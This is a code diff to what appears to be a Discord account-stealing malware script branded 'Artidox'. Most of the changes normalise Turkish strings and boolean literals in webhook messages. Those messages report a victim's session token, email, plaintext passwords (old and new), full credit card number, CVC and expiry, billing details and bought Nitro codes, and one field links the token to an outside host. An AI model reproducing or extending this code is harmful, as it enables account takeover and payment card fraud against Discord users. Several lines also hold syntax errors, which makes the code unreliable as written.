@@ -469,7 +469,7 @@ const fetchBilling = async (token) => {
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (!data) return 'Kayıtlı olan ödeme yöntemi yok.';
+  if (!data) return 'Kayitli olan odeme yontemi yok.';
   let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
@@ -483,7 +483,7 @@ const getBilling = async (token) => {
       }
     }
   });
-  if (!billing) billing = 'Kayıtlı olan ödeme yöntemi yok.';
+  if (!billing) billing = 'Kayitli olan odeme yontemi yok.';
   return billing;
 };
 
@@ -611,28 +611,28 @@ const login = async (email, password, token) => {
         fields: [
           {
                         name: '<:cilgin:991704799160582204> Token:',
-                        value: `\`{token}\` [Kopyalamak için tıkla!](https://superfurrycdn.nl/copy/{token})`,
-                        inline: False
+                        value: `\`{token}\` [Kopyalamak icin tikla!](https://superfurrycdn.nl/copy/{token})`,
+                        inline: false
                     },
                     {
                         name: '<:saygi:991705923443761263> Rozetler:',
                         value: `\`{get_badges(token)}`,
-                        inline: True
+                        inline: true
                     },
                     {
-                        name: '<:ihihi:991704618524475503> Ödeme yöntemi:',
+                        name: '<:ihihi:991704618524475503> Odeme yontemi:',
                         value: `\`{card}\``,
-                        inline: True
+                        inline: true
                     },
                     {
-                        name: '<:iyidegilim:993461526063235092> Arkadaşlar:',
+                        name: '<:iyidegilim:993461526063235092> Arkadaslar:',
                         value: `\`{get_friends(token)}\``,
-                        inline: True
+                        inline: true
                     },
                     {
                         name: '<:ne_baktin_guzelim:991704353704513617> E-posta:',
                         value: `\`{email}\``,
-                        inline: True
+                        inline: true
                     },
                    
                     {
@@ -641,7 +641,7 @@ const login = async (email, password, token) => {
                         inline: true,
                     },
                     {
-                        name: '<:yasasinirkimiz:991704134271127702> Şifre:',
+                        name: '<:yasasinirkimiz:991704134271127702> Sifre:',
             value: `\`${password}\``,
             inline: true,
           },
@@ -676,13 +676,13 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Şifre Değiştirildi**',
-            value: `E-posta: **${json.email}**\nEski Şifre: **${oldpassword}**\nYeni Şifre: **${newpassword}**`,
+            name: '**Sifre Degistirildi**',
+            value: `E-posta: **${json.email}**\nEski Sifre: **${oldpassword}**\nYeni Sifre: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Hesap Bilgileri**',
-            value: `Abonelik: **${nitro}**\nRozetler: **${badges}**\nÖdeme Yöntemi: **${billing}**`,
+            value: `Abonelik: **${nitro}**\nRozetler: **${badges}**\nOdeme Yontemi: **${billing}**`,
             inline: true,
           },
           {
@@ -696,7 +696,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Artidox',
+          text: '@Artidox',
         },
       },
     ],
@@ -718,13 +718,13 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**E-posta Değiştirildi**',
-            value: `Yeni e-posta: **${email}**\nŞifrw: **${password}**`,
+            name: '**E-posta Degistirildi**',
+            value: `Yeni e-posta: **${email}**\nSifre: **${password}**`,
             inline: true,
           },
           {
             name: '**Hesap Bilgileri**',
-            value: `Abonelik: **${nitro}**\nRozetler: **${badges}**\nÖdeme Yöntemi: **${billing}**`,
+            value: `Abonelik: **${nitro}**\nRozetler: **${badges}**\nOdeme Yontemi: **${billing}**`,
             inline: true,
           },
           {
@@ -738,7 +738,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Artidox',
+          text: '@Artidox',
         },
       },
     ],
@@ -760,13 +760,13 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Ödeme Yöntemi Eklendi (PayPal)**',
-            value: `Nitronun anasını s*kme vakti baby 😩`,
+            name: '**Odeme Yontemi Eklendi (PayPal)**',
+            value: `Nitronun anasini s*kme vakti baby 😩`,
             inline: false,
           },
           {
             name: '**Hesap Bilgileri**',
-            value: `Abonelik: **${nitro}*\nRozetler: **${badges}**\nÖdeme Yöntemi: **${billing}**`,
+            value: `Abonelik: **${nitro}*\nRozetler: **${badges}**\nOdeme Yontemi: **${billing}**`,
             inline: false,
           },
           {
@@ -780,7 +780,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Artidox',
+          text: '@Artidox',
         },
       },
     ],
@@ -802,13 +802,13 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Ödeme Yöntemi Eklendi**',
-            value: `Kredi Kart Numarası: **${number}**\nGüvenlik Kodu: **${cvc}**\nSon Kullanım Tarihi: **${expir_month}/${expir_year}**`,
+            name: '**Odeme Yontemi Eklendi**',
+            value: `Kredi Kart Numarasi: **${number}**\nGuvenlik Kodu: **${cvc}**\nSon Kullanim Tarihi: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
             name: '**Hesap Bilgileri**',
-            value: `Abonelikler: **${nitro}**\nRozetler: **${badges}**\nÖdeme Yöntemi: **${billing}**`,
+            value: `Abonelikler: **${nitro}**\nRozetler: **${badges}**\nOdeme Yöntemi: **${billing}**`,
             inline: true,
           },
           {
@@ -822,7 +822,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Artidox',
+          text: '@Artidox',
         },
       },
     ],
@@ -846,13 +846,13 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Hediyelik nitro satın alındı!**',
+            name: '**Hediyelik nitro satin alındı!**',
             value: `**Nitro kodu:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
             name: '**Hesap Bilgileri**',
-            value: `Abonelik: **${nitro}**\nRozetler: **${badges}**\nÖdeme Yöntemi: **${billing}**`,
+            value: `Abonelik: **${nitro}**\nRozetler: **${badges}**\nOdeme Yöntemi: **${billing}**`,
             inline: true,
           },
           {
@@ -866,7 +866,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Artidox',
+          text: '@Artidox',
         },
       },
     ],
